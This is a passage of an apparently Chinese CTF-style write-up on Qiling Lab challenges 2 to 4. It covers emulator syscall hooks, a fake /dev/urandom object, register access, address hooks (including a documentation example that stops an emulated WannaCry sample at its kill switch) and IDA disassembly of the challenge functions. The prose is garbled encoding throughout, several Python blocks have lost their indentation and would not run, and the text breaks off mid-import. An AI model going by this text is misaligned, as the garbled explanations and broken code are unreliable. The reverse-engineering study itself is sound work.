ç³»ç»Ÿè°ƒç”¨å¯ä»¥è¢«æŒ‚é’©ä»¥å…è®¸ç”¨æˆ·<strong>ä¿®æ”¹å…¶å‚æ•°</strong>ã€<strong>æ”¹å˜è¿”å›å€¼</strong>æˆ–<strong>å®Œå…¨æ›¿æ¢å…¶åŠŸèƒ½</strong>ã€‚ç³»ç»Ÿè°ƒç”¨å¯ä»¥é€šè¿‡å…¶åç§°æˆ–ç¼–å·è¿›è¡ŒæŒ‚é’©ï¼Œå¹¶åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªé˜¶æ®µè¿›è¡Œæ‹¦æˆªï¼š <strong>- QL_INTERCEPT.CALL -</strong> ï¼šå½“æŒ‡å®šçš„ç³»ç»Ÿè°ƒç”¨å³å°†è¢«è°ƒç”¨æ—¶ï¼Œå¯ç”¨äºå®Œå…¨æ›¿æ¢ç³»ç»Ÿè°ƒç”¨åŠŸèƒ½ï¼›**- QL_INTERCEPT.ENTER -** ï¼šåœ¨è¿›å…¥ç³»ç»Ÿè°ƒç”¨ä¹‹å‰ï¼›å¯ç”¨äºç¯¡æ”¹ç³»ç»Ÿè°ƒç”¨å‚æ•°å€¼ <strong>- QL_INTERCEPT.EXIT -</strong> ï¼šé€€å‡ºç³»ç»Ÿè°ƒç”¨åï¼Œå¯èƒ½è¢«ç”¨æ¥ç¯¡æ”¹è¿”å›å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># customized system calls always use the same arguments list as the original</span></span><br><span class="line"><span class="comment"># ones, but with a Qiling instance on front. The Qiling instance may be used</span></span><br><span class="line"><span class="comment"># to interact with various subsystems, such as the memory or registers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_syscall_write</span>(<span class="params">ql: Qiling, fd: <span class="built_in">int</span>, buf: <span class="built_in">int</span>, count: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># read data from emulated memory</span></span><br><span class="line">        data = ql.mem.read(buf, count)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># select the emulated file object that corresponds to the requested</span></span><br><span class="line">        <span class="comment"># file descriptor</span></span><br><span class="line">        fobj = ql.os.fd[fd]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># write the data into the file object, if it supports write operations</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(fobj, <span class="string">&#x27;write&#x27;</span>):</span><br><span class="line">            fobj.write(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        ret = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = count</span><br><span class="line"></span><br><span class="line">    ql.log.info(<span class="string">f&#x27;my_syscall_write(<span class="subst">&#123;fd&#125;</span>, <span class="subst">&#123;buf:#x&#125;</span>, <span class="subst">&#123;count&#125;</span>) = <span class="subst">&#123;ret&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># return a value to the caller</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;rootfs/arm_linux/bin/arm_hello&#x27;</span>], <span class="string">r&#x27;rootfs/arm_linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the following call to &#x27;set_syscall&#x27; sets &#x27;my_syscall_write&#x27; to execute whenever</span></span><br><span class="line">    <span class="comment"># the &#x27;write&#x27; system call is about to be called. that practically replaces the</span></span><br><span class="line">    <span class="comment"># existing implementation with the one in &#x27;my_syscall_write&#x27;.</span></span><br><span class="line">    ql.os.set_syscall(<span class="string">&#x27;write&#x27;</span>, my_syscall_write, QL_INTERCEPT.CALL)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># note that system calls may be referred to either by their name or number.</span></span><br><span class="line">    <span class="comment"># an equivalent alternative that replaces the write syscall by refering its number:</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#ql.os.set_syscall(4, my_syscall_write)</span></span><br><span class="line"></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>å› æ­¤è¦é€šè¿‡ql.os.set_syscallä¸­çš„QL_INTERCEPT.EXITå¯¹è¿”å›å€¼è¿›è¡Œç¯¡æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def my_uname_ret(ql ,*args): </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">struct utsname</span><br><span class="line">    &#123;</span><br><span class="line">        char sysname[65];</span><br><span class="line">        char nodename[65];</span><br><span class="line">        char release[65];</span><br><span class="line">        char version[65];</span><br><span class="line">        char machine[65];</span><br><span class="line">        char domainname[65];</span><br><span class="line">    &#125;;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">rdi_value=ql.arch.regs.read(&quot;rdi&quot;)</span><br><span class="line">ql.mem.write(rdi_value,b&#x27;QilingOS\x00&#x27;)</span><br><span class="line">ql.mem.write(rdi_value+65*3,b&#x27;ChallengeStart\x00&#x27;)</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">def challenge2(ql):</span><br><span class="line">ql.os.set_syscall(&quot;uname&quot;,my_uname_ret,QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªè¦æ³¨æ„çš„ç‚¹ï¼Œmy_uname_retçš„å‚æ•°è¦èƒ½æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><p>è¿™é‡Œçœ‹åˆ°qilingçš„ä¸€ä¸ªexample</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onexit_hook(self.ql, *self.get_syscall_args())</span><br></pre></td></tr></table></figure><p>Qilingéƒ½æ˜¯é€šè¿‡ä¸€äº›å‡½æ•°ï¼Œæ¥è¿›è¡Œhookçš„</p><blockquote><p>Qilingçš„è¿™äº›hookï¼Œéƒ½æ˜¯ä¸€äº›åœ¨ç¨‹åºçš„hookï¼Œå¹¶ä¸åƒæ­£å¸¸çš„ç¨‹åºçš„è¾“å…¥è¾“å‡ºï¼Œä¾‹å¦‚è¿™é‡Œåœ¨é€€å‡ºçš„åœ°æ–¹æ‰§è¡Œè¿™ä¸ªoxexit_hookå‡½æ•°ï¼ˆä¸ªäººç†è§£ï¼‰</p></blockquote><h3 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge3</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+1Fh] [rbp-51h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;v5, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">  <span class="built_in">getrandom</span>((__int64)v7, <span class="number">32LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == v7[i] &amp;&amp; buf[i] != v5 )</span><br><span class="line">      ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">    *a1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç¬¬ä¸€ä¸ªæƒ³æ³•å°±æ˜¯hookæ‰getrandomï¼Œæ§åˆ¶å…¶å‡½æ•°ä½“ï¼Œç„¶åå°†è™šæ‹Ÿè·¯å¾„<code>/dev/urandom</code>æ˜ å°„åˆ°æ–‡ä»¶å¯¹è±¡ä¸‹</p><p>ä»¥ä¸‹ç¤ºä¾‹å°†è™šæ‹Ÿè·¯å¾„<code>/dev/urandom</code>æ˜ å°„åˆ°æ‰˜ç®¡ç³»ç»Ÿä¸Šç°æœ‰çš„<code>/dev/urandom</code>æ–‡ä»¶ã€‚å½“æ¨¡æ‹Ÿç¨‹åºè®¿é—®<code>/dev/random</code>æ—¶ï¼Œå°†è®¿é—®æ˜ å°„æ–‡ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from qiling import Qiling</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    ql = Qiling([r&#x27;rootfs/x86_linux/bin/x86_fetch_urandom&#x27;], r&#x27;rootfs/x86_linux&#x27;)</span><br><span class="line"></span><br><span class="line">    ql.add_fs_mapper(r&#x27;/dev/urandom&#x27;, r&#x27;/dev/urandom&#x27;)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹ç¤ºä¾‹å°†è™šæ‹Ÿè·¯å¾„<code>/dev/random</code>æ˜ å°„åˆ°ç”¨æˆ·å®šä¹‰çš„æ–‡ä»¶å¯¹è±¡ï¼Œä»¥å…è®¸å¯¹äº¤äº’è¿›è¡Œæ›´ç»†ç²’åº¦çš„æ§åˆ¶ã€‚è¯·æ³¨æ„ï¼Œæ˜ å°„å¯¹è±¡æ‰©å±•äº†<code>QlFsMappedObject</code> ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;\x04&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;rootfs/x86_linux/bin/x86_fetch_urandom&#x27;</span>], <span class="string">r&#x27;rootfs/x86_linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ql.add_fs_mapper(<span class="string">r&#x27;/dev/urandom&#x27;</span>, FakeUrandom())</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;\x04&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®æ˜¯ä¸€ä¸ªç±»ï¼Œç„¶åå®šä¹‰äº†ä¸€äº›å‡½æ•°ï¼Œç”¨selfæ¥ä»£æ›¿<code>/dev/urandom</code>è¿™ä¸ªå¯¹è±¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">if</span> size==<span class="number">0x20</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x02&quot;</span>*<span class="number">32</span></span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_getrandom_func</span>(<span class="params">ql, buf, count:<span class="built_in">int</span>, flag:<span class="built_in">int</span></span>) -&gt;<span class="built_in">int</span>:</span><br><span class="line">ql.mem.write(buf,<span class="string">b&#x27;\x02&#x27;</span>*count)</span><br><span class="line"><span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&#x27;/dev/urandom&#x27;</span>, FakeUrandom())</span><br><span class="line">ql.os.set_syscall(<span class="string">&quot;getrandom&quot;</span>,my_getrandom_func,QL_INTERCEPT.CALL)</span><br></pre></td></tr></table></figure><h3 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000E1D                               ; __int64 challenge4()</span><br><span class="line">.text:0000000000000E1D                               public challenge4</span><br><span class="line">.text:0000000000000E1D                               challenge4 proc near                    ; CODE XREF: start+18Fâ†“p</span><br><span class="line">.text:0000000000000E1D</span><br><span class="line">.text:0000000000000E1D                               var_18= qword ptr -18h</span><br><span class="line">.text:0000000000000E1D                               var_8= dword ptr -8</span><br><span class="line">.text:0000000000000E1D                               var_4= dword ptr -4</span><br><span class="line">.text:0000000000000E1D</span><br><span class="line">.text:0000000000000E1D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000000E1D 55                            push    rbp</span><br><span class="line">.text:0000000000000E1E 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000E21 48 89 7D E8                   mov     [rbp+var_18], rdi</span><br><span class="line">.text:0000000000000E25 C7 45 F8 00 00 00 00          mov     [rbp+var_8], 0</span><br><span class="line">.text:0000000000000E2C C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:0000000000000E33 EB 0B                         jmp     short loc_E40</span><br><span class="line">.text:0000000000000E33</span><br><span class="line">.text:0000000000000E35                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000E35</span><br><span class="line">.text:0000000000000E35                               loc_E35:                                ; CODE XREF: challenge4+29â†“j</span><br><span class="line">.text:0000000000000E35 48 8B 45 E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000000E39 C6 00 01                      mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000E3C 83 45 FC 01                   add     [rbp+var_4], 1</span><br><span class="line">.text:0000000000000E3C</span><br><span class="line">.text:0000000000000E40</span><br><span class="line">.text:0000000000000E40                               loc_E40:                                ; CODE XREF: challenge4+16â†‘j</span><br><span class="line">.text:0000000000000E40 8B 45 F8                      mov     eax, [rbp+var_8]</span><br><span class="line">.text:0000000000000E43 39 45 FC                      cmp     [rbp+var_4], eax</span><br><span class="line">.text:0000000000000E46 7C ED                         jl      short loc_E35</span><br><span class="line">.text:0000000000000E46</span><br><span class="line">.text:0000000000000E48 90                            nop</span><br><span class="line">.text:0000000000000E49 5D                            pop     rbp</span><br><span class="line">.text:0000000000000E4A C3                            retn</span><br><span class="line">.text:0000000000000E4A                               ; &#125; // starts at E1D</span><br><span class="line">.text:0000000000000E4A</span><br><span class="line">.text:0000000000000E4A                               challenge4 endp</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œæˆ‘ä»¬æƒ³è¦çš„æ˜¯ä½¿å‚æ•°ä¸ºçœŸï¼Œè€Œloc_E35å—å¯ä»¥æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ï¼Œä½†æ˜¯<code>jl      short loc_E35</code>æ˜¯æ˜¾ç„¶æ— æ³•æ»¡è¶³çš„ï¼Œå› ä¸º-4å’Œ-8çš„ä½ç½®éƒ½è¢«ç½®ä¸º0äº†æ˜¯ç›¸ç­‰çš„ï¼Œè€Œjlæ˜¯å°äºè·³è½¬ï¼Œå› æ­¤è¦æƒ³åŠæ³•è·³è½¬åˆ°loc_E35å—ä¸Š</p><p><strong>è¯»å¯„å­˜å™¨</strong></p><ul><li>ä»å­—ç¬¦ä¸²â€œeaxâ€è¯»å–</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.read(<span class="string">&quot;EAX&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>ä» Unicorn Engine const è¯»å–</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.read(UC_X86_REG_EAX)</span><br></pre></td></tr></table></figure><ul><li>è¯»eax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eax = ql.arch.regs.eax</span><br></pre></td></tr></table></figure><ul><li>å°† 0xFF å†™å…¥â€œeaxâ€</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.write(&quot;EAX&quot;, 0xFF)</span><br></pre></td></tr></table></figure><ul><li>é€šè¿‡ Unicorn Engine const å°† 0xFF å†™å…¥ eax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.write(UC_X86_REG_EAX, <span class="number">0xFF</span>)</span><br></pre></td></tr></table></figure><ul><li>å°† 0xFF å†™å…¥ eax</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.eax =  <span class="number">0xFF</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€äº›è·¨æ¶æ„å¯„å­˜å™¨çš„è·å–æ–¹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.arch_pc</span><br><span class="line">ql.arch.regs.arch_sp  <span class="comment">#è¿™ä»…é€‚ç”¨äº PC å’Œ SPã€‚</span></span><br><span class="line">ql.arch.regs.arch_pc = <span class="number">0xFF</span></span><br><span class="line">ql.arch.regs.arch_sp = <span class="number">0xFF</span>  <span class="comment">#ä»å½“å‰æ¶æ„ä¸Šçš„ PC/SP è¯»å–ï¼Œç”± ql.arch.type å®šä¹‰</span></span><br></pre></td></tr></table></figure><ul><li>è·å–å½“å‰archå¯„å­˜å™¨è¡¨åˆ—è¡¨</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.regs.register_mapping()</span><br></pre></td></tr></table></figure><ul><li>åœ¨ 64 ä½ç¯å¢ƒä¸­ï¼Œè¿™å°†è¿”å› 64</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.reg_bits(<span class="string">&quot;rax&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>åœ¨ 64 ä½ç¯å¢ƒä¸­ï¼Œè¿™å°†è¿”å› 32</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.arch.reg_bits(<span class="string">&quot;eax&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>Hook</strong></p><p>æŒ‚é’©å…·ä½“åœ°å€ã€‚<strong>æ‰§è¡ŒæŒ‡å®šåœ°å€æ—¶å°†è°ƒç”¨å·²æ³¨å†Œçš„å›è°ƒã€‚</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.hook_addressï¼ˆå›è°ƒï¼šå¯è°ƒç”¨ï¼Œåœ°å€ï¼šintï¼‰</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">ql: Qiling</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        ql.log.info(<span class="string">&#x27;killer switch found, stopping&#x27;</span>)</span><br><span class="line">        ql.emu_stop()</span><br><span class="line"></span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;examples/rootfs/x86_windows/bin/wannacry.bin&#x27;</span>], <span class="string">r&#x27;examples/rootfs/x86_windows&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># have &#x27;stop&#x27; called when execution reaches 0x40819a</span></span><br><span class="line">    ql.hook_address(stop, <span class="number">0x40819a</span>)</span><br><span class="line"></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>æŒ‚é’©æ‰€æœ‰è¯´æ˜ã€‚æ³¨å†Œçš„å›è°ƒå°†åœ¨æ¯ä¸ªæ±‡ç¼–æŒ‡ä»¤æ‰§è¡Œä¹‹å‰è°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.hook_codeï¼ˆå›è°ƒï¼šå¯è°ƒç”¨ï¼Œ user_data ï¼šä»»ä½•=æ— ï¼‰</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> Cs</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> 